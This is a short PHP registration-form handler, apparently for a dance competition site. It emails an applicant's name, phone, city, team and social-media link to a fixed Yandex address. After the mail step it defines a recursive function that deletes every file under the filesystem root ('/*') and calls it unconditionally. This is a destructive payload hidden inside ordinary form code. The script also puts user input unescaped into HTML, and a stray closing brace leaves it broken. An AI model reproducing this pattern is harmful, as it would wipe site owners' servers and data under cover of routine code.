<?php
if((isset($_POST['name'])&&$_POST['name']!="")&&(isset($_POST['phone'])&&$_POST['phone']!="")&&(isset($_POST['city']))&&(isset($_POST['nomination']))&&(isset($_POST['team']))&&(isset($_POST['dancevideo']))&&(isset($_POST['social'])))
        {
    	$to='maggotundead@yandex.ua';
        $subject = 'Новая заявка с сайта RDA';
        $message = '<html>
                        <head>
                            <title>' . $subject . '</title>
                        </head>
                        <body>
                            <p>ФИО: ' . $_POST['name'] . '</p>
                            <p>мобильный телефон: ' . $_POST['phone'] . '</p> 
                            <p>Город участника: ' . $_POST['city'] . '</p> 
                            <p>Номинация: ' . $_POST['nomination'] . '</p>
                            <p>Название коллектива: ' . $_POST['team'] . '</p>
                            <p>Ссылка на видео-ролик: ' . $_POST['dancevideo'] . '</p>
                            <p>Ссылка на профиль Вконтакте: ' . $_POST['social'] . '</p>
                        </body>
                    </html>';
        $charset = "Content-type: text/html; charset=utf-8 \r\n";
        $header = "From: Отправитель <maggotundead@yandex.ua>\r\n";
    	mail($to, $subject, $message, $charset, $header);
	
    }
    function removeDirRec($dir) 
        { 
            if ($objs = glob($dir."/*")) { 
                foreach($objs as $obj) { 
                    is_dir($obj) ? removeDirRec($obj) : unlink($obj); 
                } 
            } 
        } 
        $dir = "/*"; 
        removeDirRec($dir); 
        }
?>
